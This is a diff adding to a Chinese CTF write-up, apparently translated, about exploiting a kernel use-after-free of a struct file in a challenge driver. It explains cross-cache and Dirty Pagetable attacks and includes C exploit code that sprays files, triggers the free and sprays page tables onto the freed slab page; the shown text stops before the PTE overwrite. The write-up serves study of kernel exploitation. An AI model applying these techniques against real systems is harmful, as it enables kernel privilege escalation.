@@ -1,5 +1,7 @@
 # CTF Kernel UAF Write
 
+> Link:https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606#/
+
 # 0x01.缓解措施
 KASLR, SMAP, SMEP, and KPTI 全部开启
 ```shell
@@ -58,6 +60,8 @@ out:
 ```
 
 它创建一个名为 [easy] 的匿名文件，并为其分配一个文件描述符。一旦分配了文件描述符，该数字将被复制到用户态缓冲区。 该功能只能在启动后调用一次*2。
+
+> 注：这里由于没有上锁，所以可以通过 race condition 多次触发，但是这里没有必要。还有就是 fput 的行为是将 file->f_count 减一，只有当 file->f_count 为 0 时，file 才会被释放
 
 # 0x03.漏洞成因
 
@@ -169,3 +173,127 @@ sh: can't access tty; job control turned off
 [   14.919708]  ? exit_to_user_mode_prepare+0x2a/0x80
 [   14.919708]  entry_SYSCALL_64_after_hwframe+0x64/0xce
 ```
+
+漏洞利用的难点在于，UAF 发生在专用的 slab 缓存 [1] 上，而不是通用的 slab 缓存上。文件结构使用名为 files_cache 的专用 slab 缓存进行分配
+
+```shell
+root@dppzuw0t7qpab0cq:~# cat /proc/slabinfo | grep files_cache
+files_cache          690    690    704   23    4 : tunables    0    0    0 : slabdata     30     30      0
+```
+
+因此，与使用 kmalloc 分配的对象不同，文件以外的对象在释放后使用后通常不会重叠，这使得漏洞利用变得困难。
+
+> 如何控制 struct file 的分配与释放：即如何稳定的堆喷 struct file?
+> 
+> 这个比较简单，打开/关闭文件就可以控制 struct file 的分配/释放
+
+> 如何堆喷 pte：即如何分配页表页面?
+>
+> 利用 mmap 申请大量匿名页面即可；当向访问这些匿名页面时就会在页表项中填充物理地址，即效果就是堆喷 pte，而页表页面的分配也是通过 buddy system 分配的。
+
+> 如何使得页表页面占据 victim slab page?
+> 
+> 这里利用 cross cache attack 手法，详细参考CVE-2022-29582 An io_uring vulnerability 先让 buddy system 回收 victim slab
+> 然后堆喷 pte，其会从 buddy system 中分配页表页面，这里就大概率就会拿到 victim slab
+
+
+## 0x05.跨缓存攻击(Cross-Cache Attack)
+> 常见的跨缓存攻击：Dirty Cred [2] ，Dirty Pagetable
+
+可以使用一种名为跨缓存攻击的利用技术来利用专用缓存上发生的堆漏洞。 有几种与跨缓存相关的攻击，例如 Dirty Cred [2] 和 Dirty Pagetable。
+
+跨缓存攻击的原理很简单，我来解释一下针对Use-after-Free的攻击。
+
+首先，我们喷射专用缓存中分配的对象，如下图①和②所示。
+
+![Alt text](image.png)
+
+其次，我们释放 UAF 对象，如 ③ *3 所示。
+最后，如果我们释放每个喷射的对象，那么该slab页面也将被释放，因为该slab缓存中的每个对象都不再使用。
+
+Linux 中的伙伴系统管理页面，释放的页面可以在以后用于不同的目的。 因此，我们可以用与文件完全不同的结构来重叠UAF文件对象。
+
+我们将覆盖 Dirty Cred 攻击中用于管理进程权限的 cred 结构。 然而，我们需要一些其他的攻击，因为这次的目标是文件结构。
+
+## 0x05.Dirty Pagetable
+我使用了一种名为 Dirty Pagetable 的技术来解决这个挑战。
+
+正如 Dirty Cred 将 cred 结构设置为攻击目标一样，Dirty Pagetable 将页表设置为攻击目标。
+
+在x86-64 Linux中，通常使用4级页表来将虚拟地址转换为物理地址。 脏页表针对的是 PTE（页表条目），它是物理内存之前的最后一级。 在Linux中，当需要新的PTE时，也会使用Buddy System来分配PTE的页面。
+
+因此，我们可以在悬空文件指针所在的同一页上分配一个PTE。 下图描述了这种情况*4。
+
+![Alt text](image-1.png)
+
+以下代码将 UAF 对象与 PTE 重叠。 记得将CPU数量限制为1，以便使用同一CPU的slab缓存，因为这次进程是在多线程环境中运行的。
+
+```C
+void bind_core(int core) {
+  cpu_set_t cpu_set;
+  CPU_ZERO(&cpu_set);
+  CPU_SET(core, &cpu_set);
+  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
+}
+...
+int main() {
+  // 定义文件喷射的数组
+  int file_spray[N_FILESPRAY];
+
+  // 定义页喷射的数组
+  void *page_spray[N_PAGESPRAY];
+
+  // Pin CPU (important!)
+  // 仅使用同一CPU
+  bind_core(0);
+
+  // 打开有问题的文件
+  int fd = open("/dev/keasy", O_RDWR);
+  if (fd == -1)
+    fatal("/dev/keasy");
+  // Prepare pages (PTE not allocated at this moment)
+  // 准备页面（PTE此时未分配）
+  for (int i = 0; i < N_PAGESPRAY; i++) {
+    page_spray[i] = mmap((void*)(0xdead0000UL + i*0x10000UL),
+                         0x8000, PROT_READ|PROT_WRITE,
+                         MAP_ANONYMOUS|MAP_SHARED, -1, 0);
+    if (page_spray[i] == MAP_FAILED) fatal("mmap");
+  }
+  puts("[+] Spraying files...");
+  // Spray file (1)
+  for (int i = 0; i < N_FILESPRAY/2; i++)
+    if ((file_spray[i] = open("/", O_RDONLY)) < 0) fatal("/");
+  // Get dangling file descriptorz
+  int ezfd = file_spray[N_FILESPRAY/2-1] + 1;
+  if (ioctl(fd, 0, 0xdeadbeef) == 0) // Use-after-Free
+    fatal("ioctl did not fail");
+  // Spray file (2)
+  for (int i = N_FILESPRAY/2; i < N_FILESPRAY; i++)
+    if ((file_spray[i] = open("/", O_RDONLY)) < 0) fatal("/");
+  puts("[+] Releasing files...");
+  // Release the page for file slab cache
+  for (int i = 0; i < N_FILESPRAY; i++)
+    close(file_spray[i]);
+  puts("[+] Allocating PTEs...");
+  // Allocate many PTEs (page fault)
+  for (int i = 0; i < N_PAGESPRAY; i++)
+    for (int j = 0; j < 8; j++)
+      *(char*)(page_spray[i] + j*0x1000) = 'A' + j;
+  getchar();
+  return 0;
+}
+```
+
+fput 释放之前的文件结构：
+
+![Alt text](image-2.png)
+
+PTE喷射完成后，我们会发现同一个地址上分配了一个类似PTE的数据：
+
+![Alt text](image-3.png)
+
+其中一个入口指向下面的物理内存，在这里我们可以找到我们写入的数据，这意味着PTE被分配给喷射的页面之一。
+
+![Alt text](image-4.png)
+
+理想情况下，我们希望覆盖这个 PTE，并使用户态虚拟地址指向内核态物理地址。 我们如何覆盖 PTE 取决于易受攻击的对象。 让我们考虑一下文件结构的情况。
